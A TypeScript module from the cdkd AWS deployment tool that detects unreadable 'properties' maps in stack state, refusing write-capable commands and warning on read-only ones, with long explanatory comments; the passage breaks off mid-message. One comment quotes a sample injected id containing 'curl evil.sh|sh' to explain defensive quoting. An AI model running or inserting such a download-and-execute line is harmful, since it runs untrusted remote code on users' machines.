/**
 * The per-entry `properties` container: its predicate, read-only repair, refusals per command, and warnings.
 *
 * Part of `src/state/malformed-resources-bag.ts`, which re-exports every public name here.
 */
import { CdkdError } from '../../utils/error-handler.js';
import { markNonRetryable } from '../../deployment/retryable-errors.js';
import { IDENT_MAX_CODE_POINTS, displayIdent } from '../../utils/display-safe.js';
import { cdkdRemedy, isInertUnquoted, proseQuoted } from '../../utils/pasteable-command.js';
import type { LockRecoveryContext } from '../lock-contention-message.js';
import { isReadableBag } from '../../types/state.js';
import type { StackState } from '../../types/state.js';
import { STATE_RESOURCES_MALFORMED, hasReadableResources, absentIfEmpty } from './core.js';
import { stackClause, inspectCommand, inspectClause } from './inspect-command.js';
import { inspectTail, SURVIVOR_THIRD_WAY_OUT, orphanRefusal } from './orphan-refusal.js';
import { EXPORT_LEGACY_LEAD, EXPORT_DELETES_STATE } from './resources.js';

/** How many logical ids a `properties` message names before it says "and N more". */
const NAMED_UNREADABLE_PROPERTY_BAGS = 5;

/**
 * The logical ids whose resource record carries a `properties` bag that cannot
 * be read as a map (issue
 * [#3191](https://github.com/go-to-k/cdkd/issues/3191)).
 *
 * A THIRD container, on the ENTRY rather than on the record root, and it is a
 * separate predicate from {@link hasReadableResources} for the reason every
 * split in this module is: the CONSEQUENCE differs. An unreadable `resources`
 * map reads as an empty STACK; an unreadable `properties` bag reads as a
 * resource whose every declared property is MISSING, which
 * `src/analyzer/diff-calculator.ts` turns into a property-change set and, for
 * a create-only property, into a REPLACEMENT of the live resource.
 *
 * `undefined` is NOT exempt here, unlike in {@link hasReadableOutputs}. That
 * exemption exists because cdkd itself writes records with no `outputs` key —
 * `JSON.stringify` drops an `undefined` field on the deploy's failure-path
 * saves. Nothing writes a resource record with no `properties`: every writer
 * in `src/` assigns an object (`cdkd import` spells it `Properties ?? {}`),
 * `JSON.stringify` never drops a `{}`, and the field is REQUIRED by
 * `ResourceState`. An absent bag is therefore a hand edit or a truncation, and
 * it is one of the two shapes that used to die on a bare `TypeError` naming no
 * stack, no key and no remedy (`Cannot convert undefined or null to object`).
 *
 * An entry that is not a readable OBJECT is SKIPPED rather than named: a `null`
 * entry has no `properties` to test, and reading one off a string entry would
 * name a per-character defect that is really the entry's. That makes this
 * verdict independent of {@link unreadableResourceEntries} for every entry
 * that is not an object — but NOT for an object with no `resourceType` whose
 * `properties` map is also unreadable, which both predicates name. A read-only caller that takes both therefore drops
 * entries FIRST ({@link repairMalformedResourceEntriesForReadOnly}), so the
 * row is reported once, as unreadable, rather than warned about as a preview
 * and then dropped. The object test stays here rather than
 * {@link isReadableResourceEntry} so this verdict does not depend on the entry
 * guard running first: narrowing it would let a typeless object with a torn
 * map through any caller that takes this predicate alone. Likewise a `resources` bag that is not readable at all
 * yields `[]` here rather than ids invented from a string's characters — that
 * class is {@link hasReadableResources}'s to report. What a caller must not do
 * is take only this one.
 */
export function unreadableResourcePropertyBags(state: StackState): readonly string[] {
  if (!hasReadableResources(state)) return [];
  return Object.entries(state.resources)
    .filter(
      ([, entry]) =>
        isReadableBag(entry) && !isReadableBag((entry as { properties?: unknown }).properties)
    )
    .map(([logicalId]) => logicalId);
}

/**
 * For a command that can WRITE state — `cdkd deploy` — refuse the record
 * naming the resources whose `properties` bag could not be read (issue
 * [#3191](https://github.com/go-to-k/cdkd/issues/3191)).
 *
 * **REFUSE, and repairing to `{}` is not the safe alternative here — it is the
 * SAME outcome.** That is the measurement the issue asked for, and it is what
 * settles the contract rather than the write-capable rule alone. Driven
 * through the real `DiffCalculator` against an `AWS::S3::Bucket` declaring
 * `BucketName`, a stored `properties` of `"abcdef"`, `[]` and `5` each
 * produced a property change carrying `requiresReplacement: true` — and `[]`
 * and `5` enumerate no keys, so they ARE the repaired-to-empty case. A repair
 * would launder a torn record into a silent REPLACE of a live resource, which
 * is the data loss the guard exists to prevent; only a refusal closes it.
 *
 * The cost is stated rather than argued away: a deploy over ONE torn record
 * aborts the whole run, including the stacks and resources that are fine.
 * That is the right trade against replacing a resource nobody asked to
 * replace, and it is paid before anything irreversible: nothing is provisioned
 * and no state is written for the stack, and the deploy's lock is released by
 * its own `finally`. The deploy raises it at its STATE LOAD too, with its own
 * stack and region (go-to-k/cdkd#3211), because a provider call ran before the
 * diff: `DeployEngine.observedCapture.kickOffAutoRefreshObservedProperties` handed the record's
 * map to `provider.readCurrentState`. The diff call stays for `cdkd diff`'s
 * sibling caller contract and any future caller.
 *
 * The identity in the message is the CALLER's, never the record's — see
 * {@link stackClause}, where an absent identity is the honest case rather than
 * a degraded one.
 *
 * Deliberately NOT folded into {@link refuseMalformedState}, for the reason
 * {@link unreadableResourcePropertyBags} gives: that predicate answers a
 * question about the record ROOT, and its callers have each had to make their
 * own decision about this one. `cdkd rollback` replays a journal rather than
 * diffing, so an unrelated broken bag would stop the command documented as the
 * way to UNWIND a stack whose state is already suspect; `cdkd scrub` and
 * `cdkd import` do not compare properties at all.
 *
 * **The rule is OPT-IN PER CALLER, not "whoever COMPARES the bag"**, and an
 * earlier revision of this sentence said the latter — which go-to-k/cdkd#3318
 * falsified within two lanes. `cdkd orphan` compares nothing and still opts in
 * through {@link refuseMalformedResourcePropertiesForOrphan}, because it SAVES
 * the bag; what each caller owes is an answer to "what would I do with a map I
 * cannot read", and comparison is only one way to owe one. Do not read this
 * paragraph as licence to delete a call from a caller that does not diff.
 */
export function refuseMalformedResourceProperties(
  state: StackState,
  stackName: string | undefined,
  region: string | undefined,
  /** The caller's account flags, carried on the inspect command (go-to-k/cdkd#4159). */
  recovery?: LockRecoveryContext
): void {
  const unreadable = unreadableResourcePropertyBags(state);
  if (unreadable.length === 0) return;
  // `markNonRetryable` for the reason `refuseMalformedNestedChildOutputs`
  // carries it: the verdict comes from a PERSISTED record, so no retry can
  // change it, while the message interpolates record-derived identifiers a
  // SUBSTRING-matching retry classifier can read as transient. Issue #1838.
  throw markNonRetryable(
    new CdkdError(
      malformedResourcePropertiesRefusalMessage(stackName, region, unreadable, recovery),
      STATE_RESOURCES_MALFORMED
    )
  );
}

/**
 * For a READ-ONLY command — `cdkd diff` — give each unreadable `properties`
 * bag an empty map so the command can report on the record, and return the ids
 * so the caller can warn.
 *
 * The read-only twin of {@link refuseMalformedResourceProperties}, and the
 * WRITE is what makes the difference, not the shape: `cdkd diff` persists
 * nothing, so it cannot launder the evidence, and previewing the remaining
 * resources beats aborting the whole preview over one torn bag.
 *
 * Repair-to-`{}` rather than a DROP of the whole entry, because an empty bag
 * IS honest for this container: the entry still names a real `resourceType`
 * and `physicalId`, so it belongs in the diff as a row.
 * Dropping it would report the resource as a CREATE, inventing a change the
 * next deploy does not make.
 *
 * What the repair does NOT do is make the preview accurate, which is why the
 * warning is not optional. The caller says so in
 * {@link malformedResourcePropertiesWarning}'s terms, which are deliberately
 * wider than "previewed as an addition": a node whose template is GONE —
 * `buildDeletedSubtree` diffs a removed nested child against an EMPTY template
 * — declares nothing, so its rows are DELETEs whose previous side is now the
 * repaired `{}` rather than what the record holds.
 *
 * Call it AFTER {@link repairMalformedResourcesForReadOnly}: an unreadable BAG
 * has no entries to walk, and the predicate deliberately returns `[]` for one.
 *
 * And call it again after anything that SPLICES further records into
 * `state.resources` — `computeStackDiff`'s rollback-orphan adoption is the one
 * such site, and its records come straight from `state.orphans[].state`, which
 * this load never walked (review of go-to-k/cdkd#3191).
 */
export function repairMalformedResourcePropertiesForReadOnly(state: StackState): readonly string[] {
  const unreadable = unreadableResourcePropertyBags(state);
  for (const logicalId of unreadable) {
    (state.resources[logicalId] as { properties: Record<string, unknown> }).properties = {};
  }
  return unreadable;
}

/** What {@link namedPropertyBagsDiagnosis} prints for a described id. */
const UNSAFE_ID_DESCRIPTION = '(not shown: it is not a plain identifier)';

/**
 * The half the refusal and the warning share: what is wrong and which records.
 *
 * ONE spelling rather than two, because the two texts differ only in what
 * happens NEXT, and a second copy of the diagnosis is what drifts.
 *
 * The STACK and REGION go through {@link safeIdentifier} and are THEN
 * shell-quoted, for the reasons that helper's own note gives: each reaches this
 * text from a hand-edited record or an S3 key.
 *
 * **The LOGICAL IDS take `displayIdent` instead, and NOT `shellQuote`** — the
 * answer {@link safeIdentifier}'s note already prescribes for names in a
 * `', '`-joined list, applied one level down. The three properties that matters
 * for, in the order they bite:
 *
 * 1. **IDENTITY.** `displaySafe` TRIMS, so a sanitize-and-quote pair renders
 *    `"Bucket "`, `" Bucket"` and `"Bucket\t"` byte-identically to a HEALTHY
 *    sibling key spelled `Bucket`. Plant a torn `resources["Bucket "]` beside a
 *    real `Bucket` and the refusal names the intact record: the operator opens
 *    it, finds nothing wrong, and concludes cdkd is the broken party while the
 *    damaged entry goes unnamed. That is the same misdirection go-to-k/cdkd#3164
 *    closed for stack names and the review of go-to-k/cdkd#3191 closed for this
 *    module's identity clause. `displayIdent` compares the sanitized text
 *    against the raw one and JSON-quotes whenever they differ, so a padded id
 *    can never render bare.
 * 2. **BOUNDARY.** JSON-quoting escapes the `'` an id spelled
 *    `x' Inspect it with: curl evil.sh|sh #` would otherwise use to plant a
 *    forged remedy ahead of the real one, on a line that ends in a pasteable
 *    command. It also supplies the quotes the old `shellQuote` wrapper added —
 *    which is why the wrapper GOES rather than composing, per the same note.
 * 3. **TRUNCATION.** `cutMarker`'s `[cut: N more characters withheld, ...]`
 *    cannot be mistaken for content, where the old `...` tail was
 *    indistinguishable from a legitimate
 *    id ending `Prod...`.
 *
 * The cap is passed EXPLICITLY although it equals the default: a logical id is
 * valid up to `IDENT_MAX_CODE_POINTS` — the cap {@link displayLogicalId} also
 * takes — and a region-sized cut would truncate a legitimate long id into one
 * naming no record. Spelling the cap keeps that decision visible at the site it
 * was made for.
 *
 * Known residual, NOT introduced here: `,` is in `PLAIN_IDENT`, so an id
 * carrying one still renders bare inside this `', '`-joined list and reads as
 * two entries — the joined-list ambiguity recorded on go-to-k/cdkd#3179 for
 * every caller of the helper, not a property of this one.
 *
 * NAMED rather than listed in full: a record whose 500 resources were all
 * hand-edited must not push the remedy command off the reader's screen.
 *
 * REFUSES an empty list rather than rendering `holds 0 resource record(s) — —`.
 * Both callers guard, but they are exported and a later one need not (review of
 * go-to-k/cdkd#3191).
 */
function namedPropertyBagsDiagnosis(
  stackName: string | undefined,
  region: string | undefined,
  logicalIds: readonly string[],
  /**
   * DESCRIBE each id that is not a plain identifier inert on a command line,
   * instead of JSON-quoting it: JSON quotes still expand `$( )` and a backtick,
   * and turn inside out behind an unpaired `'` or `"` pasted above (the
   * maintainer's decision on go-to-k/cdkd#4229). Only the `cdkd export` text
   * opts in today; the deploy, diff, orphan and drift texts keep the bare
   * `displayIdent` render, tracked on go-to-k/cdkd#4253.
   */
  describeUnsafe = false
): string {
  if (logicalIds.length === 0) {
    throw new Error(
      'malformed-resources-bag: a properties message needs at least one logical id to name'
    );
  }
  const named = logicalIds
    .slice(0, NAMED_UNREADABLE_PROPERTY_BAGS)
    // A plain id renders unchanged either way.
    .map((id) => {
      const shown = displayIdent(id, { maxCodePoints: IDENT_MAX_CODE_POINTS });
      if (!describeUnsafe || (shown === id && !/\s/.test(id) && isInertUnquoted(id))) return shown;
      return UNSAFE_ID_DESCRIPTION;
    })
    .join(', ');
  const rest = logicalIds.length - NAMED_UNREADABLE_PROPERTY_BAGS;
  const more = rest > 0 ? ` and ${rest} more` : '';
  return (
    `${stackClause(stackName, region)} holds ${logicalIds.length} resource ` +
    `record(s) whose 'properties' map cannot be read — ${named}${more} — because it is absent, ` +
    `null, or not an object. The record is malformed or truncated.`
  );
}

/**
 * {@link namedPropertyBagsDiagnosis} plus what a TEMPLATE comparison makes of
 * such a map — the clause the deploy, diff and orphan texts open with. The
 * drift texts take the diagnosis alone: drift compares no template, so this
 * sentence would describe a verdict that command never reaches (review of
 * go-to-k/cdkd#3315).
 */
function namedPropertyBagsClause(
  stackName: string | undefined,
  region: string | undefined,
  logicalIds: readonly string[]
): string {
  return (
    `${namedPropertyBagsDiagnosis(stackName, region, logicalIds)} Comparing a template against ` +
    `one reports every property the template declares as ADDED (a string bag also invents one ` +
    `change per character), and a create-only property among them is a REPLACEMENT of the live ` +
    `resource.`
  );
}

/**
 * The text {@link refuseMalformedResourceProperties} raises.
 *
 * `rawStackName` / `rawRegion` are the CALLER's resolved identity or nothing at all;
 * {@link stackClause} is the authority for why this one may be handed neither.
 *
 * **It must be true under `cdkd deploy --dry-run` as well**, and the first
 * revision was not. Provisioning is gated AFTER the diff
 * (`deploy-engine/deploy-flow.ts`'s `if (this.options.dryRun)` return sits below
 * `calculateDiff`), so a dry run reaches this refusal and aborts — while the
 * text asserted "it would DELETE and re-create resources", which a dry run
 * would not do. A refusal that misstates what was about to happen is the same
 * defect class as one naming the wrong record (review of go-to-k/cdkd#3191).
 *
 * **A dry run REFUSES rather than repairing, and that is the decision.** The
 * repair-and-warn half of this container belongs to `cdkd diff`, and the
 * argument recorded for it in `.claude/rules/state-malformed-properties.md` —
 * "a preview of the rest of the stack beats an abort" — does not transfer,
 * because it is already SATISFIED by that sibling: a user who wants the
 * repaired preview runs `cdkd diff` and gets it, with the warning. `cdkd diff`
 * refusing would leave no way to preview at all; `cdkd deploy --dry-run`
 * refusing costs nothing that is not available one command over. Against that,
 * repairing here would need a mode threaded into `calculateDiff`, the single
 * chokepoint whose whole value is that both callers share it — and it would
 * create the worst arm of all: a plausible-looking `--dry-run` plan followed
 * by a refusal the moment the flag comes off. So the message points at
 * `cdkd diff` instead of weakening the guard.
 */
export function malformedResourcePropertiesRefusalMessage(
  rawStackName: string | undefined,
  rawRegion: string | undefined,
  logicalIds: readonly string[],
  /** The caller's account flags, carried on the inspect command (go-to-k/cdkd#4159). */
  recovery?: LockRecoveryContext
): string {
  const stackName = absentIfEmpty(rawStackName);
  const region = absentIfEmpty(rawRegion);
  return (
    `${namedPropertyBagsClause(stackName, region, logicalIds)} 'cdkd deploy' can WRITE state and ` +
    `AWS resources, so it refuses rather than continuing — under '--dry-run' too, because the ` +
    `plan a dry run would print is the wrong one: a DELETE and re-create of resources the ` +
    `template did not change, and reading the bag as empty produces that same verdict rather ` +
    `than avoiding it. Nothing was provisioned and no state was written FOR THIS STACK. Repair or ` +
    `remove the record first; 'cdkd diff' previews the rest of the stack with those maps read ` +
    `as EMPTY and warns that it did. ${inspectClause(stackName, region, recovery)}Inspect the record with: ` +
    `${inspectCommand(stackName, region, recovery)}`
  );
}

/**
 * The `cdkd orphan` refusal text for the per-entry `properties` container
 * (issue [#3318](https://github.com/go-to-k/cdkd/issues/3318)).
 *
 * A SECOND `properties` refusal beside
 * {@link malformedResourcePropertiesRefusalMessage}, for the reason every
 * split in this module is its own: that text describes the DIFF's verdict —
 * "a DELETE and re-create of resources the template did not change" — which
 * `cdkd orphan` never computes. It runs no diff at all.
 *
 * **And the harm here is NOT the laundering the module's other write-capable
 * refusals describe.** Measured 2026-09-17 through the real
 * `rewriteResourceReferences` over an `AWS::S3::Bucket` record: `rewriteValue`
 * returns a non-object verbatim, so a stored `"abcdef"` comes back as
 * `"abcdef"`, a `5` as `5`, a `null` as `null`, and an ABSENT bag stays absent
 * once `JSON.stringify` drops it. Nothing is fabricated and no evidence is
 * replaced — so {@link malformedOutputsRefusalMessage}'s "saved back as a
 * well-formed six-key map" sentence, true one container over, would be FALSE
 * here and must not be borrowed.
 *
 * What it DOES share is {@link namedPropertyBagsClause}, which carries a
 * diff-shaped sentence of its own ("a create-only property among them is a
 * REPLACEMENT of the live resource"). That is not a contradiction and is not
 * an oversight: the shared clause describes what the RECORD is, and the reason
 * an operator must care is precisely that a later `cdkd deploy` / `cdkd diff`
 * reaches that verdict. What this text must not do — and what its fence pins —
 * is claim that verdict as its OWN, since `cdkd orphan` computes no diff.
 *
 * What IS at stake is the command's own job. `cdkd orphan` exists to leave the
 * record deployable: it rewrites every surviving sibling's `Ref` /
 * `Fn::GetAtt` / `Fn::Sub` reference to an orphan so the next deploy neither
 * re-creates the orphan nor fails on a stale reference. Over a map it cannot
 * read it cannot do that and cannot say it did not. A scalar bag presents no
 * reference to find, so the `--force`-less hard fail on unresolvable
 * references can never fire for one; a LIST bag is the one unreadable shape
 * `rewriteValue` DOES walk (measured: a stored `[{"Ref":"<orphan>"}]` came
 * back as `["<physicalId>"]` with one row in the audit table), so its rewrites
 * are reported into a container that is still not a map. Either way the
 * command takes a lock, saves, and reports success over a record left in
 * exactly the state `cdkd deploy` REFUSES
 * ({@link malformedResourcePropertiesRefusalMessage}) and `cdkd diff` previews
 * as a replacement — one command after the evidence was last in cdkd's hands.
 *
 * **The refusal is SCOPED to the records the save would KEEP, so orphaning the
 * DAMAGED record itself still works** —
 * {@link refuseMalformedResourcePropertiesForOrphan} is handed the ids being
 * removed and never names one. Compare
 * `malformedDestroyResourcesRefusalMessage`, which has to point at a different
 * COMMAND for its way out because a destroy keeps every record it reads.
 *
 * **But that in-command way out is CONDITIONAL, and the text must say so.**
 * `cdkd orphan` addresses resources only through the `aws:cdk:path` index of
 * the SYNTHESIZED template (`resolveConstructPaths` →
 * `buildCdkPathIndex`), so an id the CDK app no longer declares — a record
 * left behind when the construct was deleted, or one a hand edit invented —
 * can never enter the orphan set for ANY invocation. The exemption therefore
 * cannot reach it, and an earlier revision of this text nonetheless told the
 * operator to "orphan the damaged record ITSELF" unconditionally: an
 * instruction that dies on `Construct path '...' not found in template`, which
 * is the misstating-the-remedy class this module's own notes record (security
 * review of go-to-k/cdkd#3318). The remedy is now stated with its condition and
 * the two template-free ways out beside it — hand repair, and
 * `cdkd state orphan <stack>`, which needs no CDK app and drops the whole
 * record with the live resources left standing. The second is not available
 * for a stack name beginning with `-`, and the message says so for that
 * record (go-to-k/cdkd#3436, R3 of the go-to-k/cdkd#3973 review).
 *
 * So the recovery-path objection is answered for the common case by the
 * exemption and for the rest by naming commands that do not depend on the
 * template. What this does NOT claim is that `cdkd orphan` stays usable on a
 * stack holding a template-less torn record: it does not, exactly as
 * `cdkd deploy` does not (go-to-k/cdkd#3191). A state-keyed escape hatch
 * (`--orphan-logical-id`, addressing a record by its state key rather than by
 * a construct path) was considered in the same review and DECLINED: it is a new
 * mutating CLI surface whose only job is to route around a record the operator
 * must repair or drop anyway, and `cdkd state orphan <stack>` already removes
 * such a record with no CDK app and no new flag.
 *
 * It must be true under `--dry-run` as well, and it is: the guard sits at the
 * load, far above the `if (options.dryRun)` return. Refusing there is
 * {@link malformedResourcePropertiesRefusalMessage}'s call for the same
 * reason — a plausible rewrite audit table followed by a refusal the moment
 * the flag comes off is the worst arm of all.
 *
 * `rawStackName` / `rawRegion` are the CALLER's resolved identity — the synthesized
 * stack name and the region `pickStackRegion` settled on, never the record's
 * own unvalidated self-report (though an assembly-supplied stack name is not
 * validated either — go-to-k/cdkd#3360). See {@link stackClause}.
 */
export function malformedOrphanResourcePropertiesRefusalMessage(
  rawStackName: string | undefined,
  rawRegion: string | undefined,
  logicalIds: readonly string[],
  /**
   * The caller's `--profile` / resolved bucket / `--state-prefix`, threaded so
   * the remedy and the object path name the bucket the record is actually in.
   * Optional so the message stays buildable with the identity alone.
   */
  recovery?: LockRecoveryContext
): string {
  // NORMALISE ONCE, here, rather than in each of the helpers below.
  // `cdkd orphan` hands `undefined` for a legacy record with no region since
  // go-to-k/cdkd#3359 (it used to hand `pickStackRegion`'s loaded region,
  // `''` when nothing else was known), but an empty string is still not an
  // identity: `displaySafe('')` is `<unrenderable>`, so every helper that
  // treats "absent" as `undefined` renders a placeholder that names no record
  // AND collides with its own wrapping quotes. Hoisting protects every helper
  // below together — `stackClause`, `dropRecordCommand`,
  // `withheldIdentityClause` and `orphanInspectClause`; guarding inside one of
  // them fixed only part of the message (measured -- the first cut did exactly
  // that, and the other clauses still rendered `('<unrenderable>')` and
  // `--stack-region '<unrenderable>'`).
  const stackName = absentIfEmpty(rawStackName);
  const region = absentIfEmpty(rawRegion);
  return orphanRefusal(
    stackName,
    region,
    recovery,
    `${namedPropertyBagsClause(stackName, region, logicalIds)} 'cdkd orphan' REWRITES and SAVES ` +
      `every record it keeps, so it refuses rather than continuing — under '--dry-run' too, ` +
      `because the rewrite audit table a dry run prints is the wrong one. It is not that the save ` +
      `would fabricate a map: an unreadable bag is carried through VERBATIM. It is that this ` +
      `command exists to leave the record deployable by rewriting every reference to an orphaned ` +
      `resource, and a map it cannot read hides whichever references it holds — a string or a ` +
      `number presents none to find, and a list is walked, so its rewrites are recorded into a ` +
      `container that is still not a map. Continuing would rewrite, save, and report success over ` +
      `a record 'cdkd deploy' then REFUSES.`,
    SURVIVOR_THIRD_WAY_OUT
  );
}

/**
 * For `cdkd orphan`: refuse a record whose SURVIVING resource entries carry a
 * `properties` bag that cannot be read (issue
 * [#3318](https://github.com/go-to-k/cdkd/issues/3318)).
 *
 * A separate call from {@link refuseMalformedResourceProperties} rather than a
 * flag on it, for the reason {@link refuseMalformedOutputsForDestroy} is
 * separate from {@link refuseMalformedOutputs}: the refusal a user sees must
 * describe what THIS command would have done with the bag, and
 * {@link malformedOrphanResourcePropertiesRefusalMessage} records how far the
 * two consequences diverge.
 *
 * `removedLogicalIds` is the orphan set — the ids this run is dropping from
 * `state.resources`. They are EXCLUDED from the verdict because the save
 * cannot persist a record it is deleting, and because refusing on one would
 * break the recovery path the refusal is otherwise meant to preserve.
 *
 * **It covers the `properties` map of a `state.resources` entry ONLY, and the
 * save keeps more than that.** Three siblings answer for the rest, each its
 * own call because each is its own container with its own consequence:
 * {@link refuseMalformedResourceEntriesForOrphan} for an entry that is not a
 * record at all — the one shape the save RESHAPES rather than carries
 * (go-to-k/cdkd#3350) — {@link refuseMalformedResourceAttributesForOrphan} for
 * the entry's `attributes` map (go-to-k/cdkd#3345), and
 * {@link refuseMalformedOrphansForOrphan} for `state.orphans[]`, which the
 * rewrite spreads through `carriedState` without reading (go-to-k/cdkd#3344).
 * This scan skips an entry that is not an object, which is why the first of
 * them has to exist: its "carried through VERBATIM" sentence is true of the
 * container it scans and false of the one above it.
 *
 * CALL IT AT THE LOAD, beside {@link refuseMalformedState} and
 * {@link refuseMalformedOutputs}, above `rewriteResourceReferences` — the
 * placement rule {@link repairMalformedResourcesForReadOnly}'s note records.
 * The orphan set is resolved from the synthesized template before the state is
 * loaded, so nothing forces this call any lower.
 */
export function refuseMalformedResourcePropertiesForOrphan(
  state: StackState,
  removedLogicalIds: readonly string[],
  stackName: string | undefined,
  region: string | undefined,
  /** See {@link malformedOrphanResourcePropertiesRefusalMessage}. */
  recovery?: LockRecoveryContext
): void {
  const removed = new Set(removedLogicalIds);
  const unreadable = unreadableResourcePropertyBags(state).filter((id) => !removed.has(id));
  if (unreadable.length === 0) return;
  // NOT `markNonRetryable`, and for the reason {@link refuseMalformedState}
  // states for the same command: `cdkd orphan` raises this from its own top
  // level — `rewriteResourceReferences` is called from nowhere else — so there
  // is no `withRetry` for the marker to fence. Named in
  // `tests/unit/state/malformed-resources-bag.test.ts`'s UNMARKED table beside
  // its siblings, so another refusal still cannot join them silently.
  throw new CdkdError(
    malformedOrphanResourcePropertiesRefusalMessage(stackName, region, unreadable, recovery),
    STATE_RESOURCES_MALFORMED
  );
}

/**
 * The warning a caller of {@link repairMalformedResourcePropertiesForReadOnly}
 * emits.
 */
export function malformedResourcePropertiesWarning(
  rawStackName: string | undefined,
  rawRegion: string | undefined,
  logicalIds: readonly string[],
  /** The caller's account flags, carried on the inspect command (go-to-k/cdkd#4159). */
  recovery?: LockRecoveryContext
): string {
  const stackName = absentIfEmpty(rawStackName);
  const region = absentIfEmpty(rawRegion);
  return (
    `${namedPropertyBagsClause(stackName, region, logicalIds)} Continuing with those maps ` +
    `EMPTY: what these records are stored as holding is NOT what this preview compares against. ` +
    `Where the template still declares the resource, every property it declares previews as an ` +
    `addition and a create-only one as a replacement; where it no longer declares it, the ` +
    `DELETE row shows an empty previous side instead of the stored one. ` +
    `Do NOT run 'cdkd deploy' against this record — it REFUSES on the same defect rather than ` +
    `acting on this preview. ${inspectClause(stackName, region, recovery)}See the stored values with: ${inspectCommand(stackName, region, recovery)}`
  );
}

/**
 * Why a `cdkd drift` text cannot borrow the deploy or diff one (issue
 * [#3315](https://github.com/go-to-k/cdkd/issues/3315)): drift compares no
 * template, so "previews as an addition" and "under '--dry-run' too" are false
 * there — and so is the template sentence {@link namedPropertyBagsClause}
 * appends, which is why they open with {@link namedPropertyBagsDiagnosis}. What
 * the bag IS to drift is shared by both drift texts below, so it is
 * spelled once: the BASELINE wherever no `observedProperties` is recorded, and
 * the source of the secret positions the report masks either way. Read as
 * empty, `calculateResourceDrift` walks the state side's keys only and so
 * reports the resource CLEAN having compared nothing.
 */
const DRIFT_PROPERTIES_ROLE =
  `To 'cdkd drift' this map is the baseline wherever no 'observedProperties' is recorded — a ` +
  `stored string reads as one drifted key per character, and an EMPTY reading compares nothing ` +
  `and reports the resource clean — and it is where cdkd finds the secret positions it must mask.`;

/**
 * The text {@link refuseMalformedResourcePropertiesForDrift} raises.
 *
 * `rawStackName` / `rawRegion` are the state KEY's identity `cdkd drift` listed
 * the record under, never the body's self-report. Ends ON the read command, the
 * shape every read-only remedy in this module takes.
 */
export function malformedDriftResourcePropertiesRefusalMessage(
  rawStackName: string | undefined,
  rawRegion: string | undefined,
  logicalIds: readonly string[],
  /** The caller's account flags, carried on the inspect command (go-to-k/cdkd#4159). */
  recovery?: LockRecoveryContext
): string {
  const stackName = absentIfEmpty(rawStackName);
  const region = absentIfEmpty(rawRegion);
  return (
    `${namedPropertyBagsDiagnosis(stackName, region, logicalIds)} 'cdkd drift --accept' and ` +
    `'--revert' WRITE this record back, so they refuse rather than continuing. ` +
    `${DRIFT_PROPERTIES_ROLE} Continuing would let '--accept' save, and '--revert' push to the ` +
    `live resource, a verdict about properties this record does not hold. Nothing was written ` +
    `and no AWS resource was modified. Repair or remove the record first; plain 'cdkd drift' ` +
    `compares the rest of the stack and reports these resources as not compared. ` +
    `${inspectClause(stackName, region, recovery)}Inspect the record with: ${inspectCommand(stackName, region, recovery)}`
  );
}

/**
 * For `cdkd drift --accept` / `--revert`: refuse a record whose resource
 * entries carry a `properties` map that cannot be read (issue
 * [#3315](https://github.com/go-to-k/cdkd/issues/3315)).
 *
 * The same predicate as {@link refuseMalformedResourceProperties}, and a
 * separate entry point for the reason every split here has: that one's text
 * describes a deploy's diff and a `--dry-run` this command does not have.
 *
 * CALL IT AT THE LOAD, after `refuseMalformedResourceEntries` (a typeless
 * object with a torn map is named by both, and the entry refusal is the more
 * precise one), above every walk — both write modes read the record the
 * detection pass loaded, so one call there dominates them.
 */
export function refuseMalformedResourcePropertiesForDrift(
  state: StackState,
  stackName: string | undefined,
  region: string | undefined,
  /** The caller's account flags, carried on the inspect command (go-to-k/cdkd#4159). */
  recovery?: LockRecoveryContext
): void {
  const unreadable = unreadableResourcePropertyBags(state);
  if (unreadable.length === 0) return;
  // NOT `markNonRetryable`, for the reason `refuseMalformedState` gives for
  // the same caller: `cdkd drift` raises it from its own flow, outside any
  // `withRetry`. Named in the test file's UNMARKED table.
  throw new CdkdError(
    malformedDriftResourcePropertiesRefusalMessage(stackName, region, unreadable, recovery),
    STATE_RESOURCES_MALFORMED
  );
}

/**
 * The warning plain `cdkd drift` emits after
 * {@link repairMalformedResourcePropertiesForReadOnly}. The caller ALSO reports
 * each named id as not compared — the warning goes to stderr, and a repaired
 * `{}` baseline would otherwise read as a clean resource.
 */
export function malformedDriftResourcePropertiesWarning(
  rawStackName: string | undefined,
  rawRegion: string | undefined,
  logicalIds: readonly string[],
  /** The caller's account flags, carried on the inspect command (go-to-k/cdkd#4159). */
  recovery?: LockRecoveryContext
): string {
  const stackName = absentIfEmpty(rawStackName);
  const region = absentIfEmpty(rawRegion);
  return (
    `${namedPropertyBagsDiagnosis(stackName, region, logicalIds)} ${DRIFT_PROPERTIES_ROLE} So ` +
    `'cdkd drift' does NOT compare these resources: each is reported as not compared, and the ` +
    `run does not exit clean. The rest of the stack is compared as usual. ` +
    `'cdkd drift --accept' / '--revert' and 'cdkd deploy' REFUSE this record. ` +
    `${inspectClause(stackName, region, recovery)}See the stored values with: ` +
    `${inspectCommand(stackName, region, recovery)}`
  );
}

/**
 * The text {@link refuseMalformedResourcePropertiesForExport} raises (issue
 * [#3315](https://github.com/go-to-k/cdkd/issues/3315)).
 *
 * Its own text for the reason each of the others has one: export compares no
 * template against the map — so {@link namedPropertyBagsClause}'s ADDED /
 * REPLACEMENT sentence is false here and the text opens with
 * {@link namedPropertyBagsDiagnosis} — and it neither saves the record back
 * nor pushes a baseline. What it does with the map is READ it: the import
 * identifier of a type keyed by a property, the mask check that blocks a
 * redacted value, and the inline policy's principals and a Stage's `ApiId`
 * that the phase-2 pre-delete removes. `?? {}` covered only `null` and
 * `undefined`, so a stored string reached all of them. Then the export DELETES
 * the record, the only evidence of the damage.
 *
 * `rawRegion` is `undefined` for a record loaded from the legacy key, which
 * ends on the object key ({@link malformedExportResourcesRefusalMessage}).
 */
export function malformedExportResourcePropertiesRefusalMessage(
  rawStackName: string | undefined,
  rawRegion: string | undefined,
  logicalIds: readonly string[],
  /** See {@link malformedStateRefusalMessage}. */
  recovery?: LockRecoveryContext
): string {
  const stackName = absentIfEmpty(rawStackName);
  const region = absentIfEmpty(rawRegion);
  return inspectTail(
    `${namedPropertyBagsDiagnosis(stackName, region, logicalIds, true)} ${EXPORT_DELETES_STATE} ` +
      `The export reads this map to build the CloudFormation import identifier, to ` +
      `check it for the redaction mask, and to find what a phase-2 pre-delete removes, so a ` +
      `map it cannot read makes each of those answers wrong — and the record showing the ` +
      `damage is deleted once the export succeeds. Nothing was imported and no state was ` +
      `written. Repair the record by hand, or re-import each named resource with a selective ` +
